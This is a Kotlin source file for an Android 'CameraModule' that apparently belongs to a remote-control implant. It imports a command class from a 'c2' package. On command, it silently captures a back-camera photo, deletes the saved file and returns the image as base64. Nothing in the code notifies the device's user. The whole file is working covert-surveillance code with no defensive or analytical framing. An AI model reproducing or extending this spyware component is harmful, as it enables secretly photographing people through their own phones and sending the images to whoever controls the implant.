package org.synapse.core.modules

import android.util.Base64
import android.util.Log
import org.synapse.core.c2.Command
import org.synapse.core.core.SynapseResponse
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.io.File
import java.util.concurrent.Executors
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import android.content.Context
import androidx.lifecycle.LifecycleOwner

object CameraModule {

    private const val TAG = "Synapse.Camera"
    private val json = Json { prettyPrint = false }

    suspend fun capture(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.Main) {
        try {
            val cameraProvider = ProcessCameraProvider.getInstance(context).get()
            val imageCapture = ImageCapture.Builder()
                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                .build()

            val cameraSelector = CameraSelector.DEFAULT_BACK_CAMERA
            val lifecycleOwner = context as LifecycleOwner
            val camera = cameraProvider.bindToLifecycle(lifecycleOwner, cameraSelector, imageCapture)

            val photoFile = File(context.cacheDir, "capture_${System.currentTimeMillis()}.jpg")
            val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

            val result = kotlinx.coroutines.suspendCancellableCoroutine<ByteArray?> { cont ->
                imageCapture.takePicture(
                    outputOptions,
                    Executors.newSingleThreadExecutor(),
                    object : ImageCapture.OnImageSavedCallback {
                        override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                            try {
                                val bytes = photoFile.readBytes()
                                photoFile.delete()
                                cont.resume(bytes) {}
                            } catch (e: Exception) {
                                cont.resume(null) {}
                            }
                        }

                        override fun onError(exc: ImageCaptureException) {
                            Log.e(TAG, "Capture error: ${exc.message}")
                            cont.resume(null) {}
                        }
                    }
                )
            }

            cameraProvider.unbindAll()

            if (result != null && result.isNotEmpty()) {
                val b64 = Base64.encodeToString(result, Base64.NO_WRAP)
                SynapseResponse.CameraResponse(
                    image_base64 = b64,
                    width = 0,
                    height = 0,
                    format = "JPEG",
                    size_bytes = result.size.toLong()
                )
            } else {
                SynapseResponse.ErrorResponse(error = "capture_failed", module = "camera")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Camera failed: ${e.message}")
            SynapseResponse.ErrorResponse(error = "camera:${e.message}", module = "camera")
        }
    }
}
